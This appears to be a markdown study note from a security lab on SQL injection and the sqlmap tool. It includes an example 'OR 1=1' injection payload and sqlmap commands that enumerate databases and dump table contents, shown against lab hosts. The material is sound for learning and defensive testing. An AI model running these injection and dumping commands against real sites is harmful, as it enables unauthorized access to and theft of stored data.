# SQLMap

Sometimes, when input is improperly sanitized, meaning that user input is not validated, attackers can manipulate the input and write SQL queries that would get executed in the database and perform the attacker’s desired actions


`SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';`

SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities.


If you don't want to manually add the flags for sqlmap, use `sqlmap --wizard` and it'll guide you through all the steps. 

## FLAGS

`--dbs` - helps you extract all the database names
`-D database_name --tables` - extracts information about the database tables
`-D database_name -T table_name --dump` - allows you to enumerate records of those database tables

<hr />

## Example 

Look for URLs that have GET parameters, as they are known to be vulnerable to SQL injection

`sqlmap -u urlwithgetparameter`
- This is going to test for different SQL injection vulnerabilities, and will output a list of the different vulnerabilities identified on the target URL.

`sqlmap -u urlwithgetparameter --dbs`
- This is going to fetch the database names from your vulnerable target URL

`sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables`
- Lets say you got returned two database names, users and members. To get the tables inside of a database, you would select one by using the `-D` flag, listing the database name after the flag and also adding the `--tables` flag

`sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T mel --dump`
- Now we want to dump all the data within a table. Let's say you saw a table name was mel. You would add the `-T` flag to select a specific table, and add the flag `--dump` at the end to dump all the data within that table.

<hr />

You can also use POST-based testing, where the application sends data in the request's body instead of the URL. Examples of this could be login forms, registration forms, etc. To follow this approach, you must intercept a POST request on the login or registration page and save it as a text file. You can use the following command to input that request saved in the text file to the SQLMap tool:

`sqlmap -r intercepted_request.txt`

<hr />

## How to get url with get parameters if not explicitly obvious, like login forms

**Step 1** - First we're going to have to inspect the code and look at the form. 
**Step 2** - Go to the network tab
**Step 3** - Enter test credentials and check the network tab
**Step 4** - Make sure you click the 'all' tab on the network tab so you can see everything being sent. 
<img width="1468" height="420" alt="image" src="https://github.com/user-attachments/assets/5644637f-fa48-4c33-8c13-5545ee30489e" />

**Step 5** - Use the get request url for sqlmap. Make sure to include the url inside single quotes to avoid errors with special characters. 
  
